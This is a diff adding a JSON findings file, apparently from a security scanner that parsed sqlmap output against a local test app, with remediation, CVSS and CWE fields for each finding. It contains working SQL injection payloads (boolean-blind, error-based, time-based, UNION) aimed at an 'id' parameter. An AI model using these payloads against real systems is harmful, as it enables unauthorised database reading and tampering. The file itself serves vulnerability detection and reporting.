@@ -1,0 +1,135 @@
+[
+  {
+    "seq": 0,
+    "verification_status": "candidate",
+    "verified_by": "engine",
+    "verification_reason": "",
+    "kind": "sqli",
+    "severity": "critical",
+    "source": "sqlmap",
+    "data": {
+      "parameter": "id",
+      "type": "boolean-based blind",
+      "title": "AND boolean-based blind - WHERE or HAVING clause",
+      "payload": "id=1' AND 2679=2679 AND 'DNHo'='DNHo",
+      "_request_context": {
+        "method": "GET",
+        "url": "http://127.0.0.1:8100/low?id=1",
+        "parameter": "id"
+      }
+    },
+    "raw_line": "    Payload: id=1' AND 2679=2679 AND 'DNHo'='DNHo",
+    "remediation": "Use parameterized queries (prepared statements) for every database interaction. Never concatenate user input into SQL strings. Add a WAF with SQL-injection rules as defense in depth.",
+    "impact": "Confirmed SQL injection permits arbitrary database read/write, often leading to full application compromise and lateral movement.",
+    "cvss": 9.8,
+    "cwe": "CWE-89",
+    "references": [],
+    "lookup_hint": "",
+    "proof": ""
+  },
+  {
+    "seq": 1,
+    "verification_status": "candidate",
+    "verified_by": "engine",
+    "verification_reason": "",
+    "kind": "sqli",
+    "severity": "critical",
+    "source": "sqlmap",
+    "data": {
+      "parameter": "id",
+      "type": "error-based",
+      "title": "SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)",
+      "payload": "id=1' AND 2445=JSON_EXTRACT(CHAR(123,125),CHAR(113,118,98,122,113)||(SELECT (CASE WHEN (2445=2445) THEN 1 ELSE 0 END))||CHAR(113,112,112,118,113)) AND 'aaTA'='aaTA",
+      "_request_context": {
+        "method": "GET",
+        "url": "http://127.0.0.1:8100/low?id=1",
+        "parameter": "id"
+      }
+    },
+    "raw_line": "    Payload: id=1' AND 2445=JSON_EXTRACT(CHAR(123,125),CHAR(113,118,98,122,113)||(SELECT (CASE WHEN (2445=2445) THEN 1 ELSE 0 END))||CHAR(113,112,112,118,113)) AND 'aaTA'='aaTA",
+    "remediation": "Use parameterized queries (prepared statements) for every database interaction. Never concatenate user input into SQL strings. Add a WAF with SQL-injection rules as defense in depth.",
+    "impact": "Confirmed SQL injection permits arbitrary database read/write, often leading to full application compromise and lateral movement.",
+    "cvss": 9.8,
+    "cwe": "CWE-89",
+    "references": [],
+    "lookup_hint": "",
+    "proof": ""
+  },
+  {
+    "seq": 2,
+    "verification_status": "candidate",
+    "verified_by": "engine",
+    "verification_reason": "",
+    "kind": "sqli",
+    "severity": "critical",
+    "source": "sqlmap",
+    "data": {
+      "parameter": "id",
+      "type": "time-based blind",
+      "title": "SQLite > 2.0 AND time-based blind (heavy query)",
+      "payload": "id=1' AND 2136=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'RGep'='RGep",
+      "_request_context": {
+        "method": "GET",
+        "url": "http://127.0.0.1:8100/low?id=1",
+        "parameter": "id"
+      }
+    },
+    "raw_line": "    Payload: id=1' AND 2136=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'RGep'='RGep",
+    "remediation": "Use parameterized queries (prepared statements) for every database interaction. Never concatenate user input into SQL strings. Add a WAF with SQL-injection rules as defense in depth.",
+    "impact": "Confirmed SQL injection permits arbitrary database read/write, often leading to full application compromise and lateral movement.",
+    "cvss": 9.8,
+    "cwe": "CWE-89",
+    "references": [],
+    "lookup_hint": "",
+    "proof": ""
+  },
+  {
+    "seq": 3,
+    "verification_status": "candidate",
+    "verified_by": "engine",
+    "verification_reason": "",
+    "kind": "sqli",
+    "severity": "critical",
+    "source": "sqlmap",
+    "data": {
+      "parameter": "id",
+      "type": "UNION query",
+      "title": "Generic UNION query (NULL) - 3 columns",
+      "payload": "id=1' UNION ALL SELECT NULL,CHAR(113,118,98,122,113)||CHAR(69,86,66,72,83,118,115,104,80,99,82,113,66,106,102,83,101,112,75,108,82,107,98,83,83,118,69,121,84,101,74,109,73,107,81,114,117,112,81,115)||CHAR(113,112,112,118,113),NULL-- oDKb",
+      "_request_context": {
+        "method": "GET",
+        "url": "http://127.0.0.1:8100/low?id=1",
+        "parameter": "id"
+      }
+    },
+    "raw_line": "    Payload: id=1' UNION ALL SELECT NULL,CHAR(113,118,98,122,113)||CHAR(69,86,66,72,83,118,115,104,80,99,82,113,66,106,102,83,101,112,75,108,82,107,98,83,83,118,69,121,84,101,74,109,73,107,81,114,117,112,81,115)||CHAR(113,112,112,118,113),NULL-- oDKb",
+    "remediation": "Use parameterized queries (prepared statements) for every database interaction. Never concatenate user input into SQL strings. Add a WAF with SQL-injection rules as defense in depth.",
+    "impact": "Confirmed SQL injection permits arbitrary database read/write, often leading to full application compromise and lateral movement.",
+    "cvss": 9.8,
+    "cwe": "CWE-89",
+    "references": [],
+    "lookup_hint": "",
+    "proof": ""
+  },
+  {
+    "seq": 4,
+    "verification_status": "candidate",
+    "verified_by": "engine",
+    "verification_reason": "",
+    "kind": "sqli_info",
+    "severity": "medium",
+    "source": "sqlmap",
+    "data": {
+      "key": "dbms",
+      "value": "SQLite"
+    },
+    "raw_line": "back-end DBMS: SQLite",
+    "remediation": "Keep the DBMS patched and restrict network access to it.",
+    "impact": "Identifies the DBMS, enabling targeted follow-up.",
+    "cvss": 5.3,
+    "cwe": "CWE-89",
+    "references": [],
+    "lookup_hint": "",
+    "proof": ""
+  }
+]
